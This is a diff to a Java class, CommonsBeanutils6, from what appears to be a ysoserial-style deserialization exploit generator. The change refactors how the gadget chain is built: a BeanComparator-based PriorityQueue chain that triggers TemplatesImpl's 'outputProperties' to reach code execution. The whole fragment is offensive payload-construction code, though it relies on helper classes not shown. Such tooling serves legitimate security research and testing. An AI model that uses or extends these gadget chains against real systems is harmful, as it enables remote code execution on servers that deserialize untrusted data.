@@ -7,6 +7,9 @@ import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
+import com.ppp.utils.RanDomUtils;
+
+import java.util.Comparator;
 
 /**
  * @author Whoopsunix
@@ -26,12 +29,14 @@ public class CommonsBeanutils6 implements ObjectPayload<Object> {
         // sink
         Object sinkObject = SinkScheduler.builder(sinksHelper);
 
-        Object kickOffObject = getChain(sinkObject, sinksHelper.getCBVersion());
+        Object kickOffObject = getChain(sinkObject, sinksHelper.getCbVersion());
 
         return kickOffObject;
     }
 
-    public Object getChain(Object templates, String version) throws Exception {
-        return BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.ObjectToStringComparator, templates, version);
+    public Object getChain(Object templates, CBVersionEnum version) throws Exception {
+        Comparator comparator = BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.ObjectToStringComparator, version);
+
+        return BeanComparatorBuilder.queueGadgetMaker(comparator, templates, RanDomUtils.generateRandomString(1), "outputProperties");
     }
 }
